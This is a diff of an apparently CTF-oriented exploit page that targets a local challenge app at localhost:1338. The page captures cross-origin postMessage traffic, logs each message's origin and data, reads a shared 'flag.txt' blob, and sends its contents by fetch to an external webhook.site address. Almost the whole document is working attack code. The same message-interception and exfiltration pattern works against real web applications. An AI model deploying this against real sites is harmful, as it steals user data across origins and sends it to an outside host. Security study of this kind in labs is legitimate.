@@ -12,25 +12,44 @@
         const status = document.getElementById('status');
         const output = document.getElementById('output');
         
-        // Strategy 1: Listen for postMessage events
+        let messageCount = 0;
+        
+        // Strategy 1: Listen for postMessage events - THIS IS THE MAIN ATTACK
         window.addEventListener('message', function(event) {
-            console.log('Received message:', event);
-            status.innerHTML = 'Received postMessage: ' + JSON.stringify(event.data);
+            messageCount++;
+            console.log('Received message #' + messageCount + ':', event);
+            
+            status.innerHTML = `Received ${messageCount} messages. Latest: ` + JSON.stringify(event.data).substring(0, 100);
+            
+            // Log all message details
+            const logDiv = document.createElement('div');
+            logDiv.innerHTML = `<strong>Message ${messageCount}:</strong><br>
+                Origin: ${event.origin}<br>
+                Data: ${JSON.stringify(event.data, null, 2)}<br><hr>`;
+            output.appendChild(logDiv);
             
             // Check if this is the flag sharing message
             if (event.data && event.data.type === 'share' && event.data.files) {
                 event.data.files.forEach(file => {
                     if (file.name === 'flag.txt') {
+                        output.innerHTML += '<strong style="color: red;">FLAG FILE DETECTED!</strong><br>';
+                        
                         // Try to read the blob
                         if (file.blob) {
                             file.blob.text().then(flag => {
-                                output.innerHTML = '<strong>FLAG FOUND:</strong> ' + flag;
-                                // Send flag to your server
-                                fetch('https://webhook.site/1b541b21-a716-4114-8883-dd4b1936f9df/flag', {
+                                output.innerHTML += '<strong style="color: green; font-size: 20px;">FLAG FOUND: ' + flag + '</strong><br>';
+                                
+                                // Also log to console
+                                console.log('FLAG:', flag);
+                                
+                                // Send flag to webhook (replace with your webhook URL)
+                                fetch('https://webhook.site/1b541b21-a716-4114-8883-dd4b1936f9df', {
                                     method: 'POST',
-                                    body: JSON.stringify({flag: flag}),
+                                    body: JSON.stringify({flag: flag, timestamp: new Date().toISOString()}),
                                     headers: {'Content-Type': 'application/json'}
-                                });
+                                }).catch(e => console.log('Webhook failed:', e));
+                            }).catch(e => {
+                                output.innerHTML += '<strong>Error reading blob:</strong> ' + e.message + '<br>';
                             });
                         }
                     }
@@ -38,65 +57,20 @@
             }
         });
 
-        // Strategy 2: Try to open the challenge page and access it
-        try {
-            const challengeWindow = window.open('http://localhost:1338', '_blank');
-            
-            setTimeout(() => {
-                try {
-                    // Try to access the challenge page content
-                    const challengeDoc = challengeWindow.document;
-                    status.innerHTML += '<br>Opened challenge window';
-                    
-                    // Look for any flag content in the DOM
-                    const bodyText = challengeDoc.body.innerText;
-                    if (bodyText.includes('CTF{') || bodyText.includes('flag')) {
-                        output.innerHTML = '<strong>Found in DOM:</strong> ' + bodyText;
-                    }
-                    
-                } catch (e) {
-                    status.innerHTML += '<br>Cannot access challenge window: ' + e.message;
-                }
-            }, 2000);
-            
-        } catch (e) {
-            status.innerHTML += '<br>Cannot open challenge window: ' + e.message;
-        }
-
-        // Strategy 3: Try iframe approach
+        // Keep iframe for potential message relay
         const iframe = document.createElement('iframe');
         iframe.src = 'http://localhost:1338';
         iframe.style.width = '100%';
-        iframe.style.height = '400px';
+        iframe.style.height = '200px';
+        iframe.style.border = '1px solid #ccc';
         document.body.appendChild(iframe);
         
-        iframe.onload = function() {
-            status.innerHTML += '<br>Iframe loaded';
-            try {
-                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                const content = iframeDoc.body.innerText;
-                if (content.includes('CTF{')) {
-                    output.innerHTML = '<strong>Found in iframe:</strong> ' + content;
-                }
-            } catch (e) {
-                status.innerHTML += '<br>Cannot access iframe: ' + e.message;
-            }
-        };
-
-        // Strategy 4: Post a message to try to trigger the flag sharing again
+        // Add some debug info
         setTimeout(() => {
-            // Try to trigger the flag sharing mechanism
-            window.postMessage({
-                type: "request_flag"
-            }, "*");
-            
-            // Also try to post to iframe
-            if (iframe.contentWindow) {
-                iframe.contentWindow.postMessage({
-                    type: "request_flag"
-                }, "*");
-            }
-        }, 3000);
+            status.innerHTML += '<br><strong>Exploit Status:</strong> Listening for postMessage events...';
+            status.innerHTML += '<br><strong>Target:</strong> Waiting for flag sharing message from localhost:1338';
+            status.innerHTML += '<br><strong>Note:</strong> Cross-origin errors are expected and normal!';
+        }, 1000);
 
     </script>
 </body>
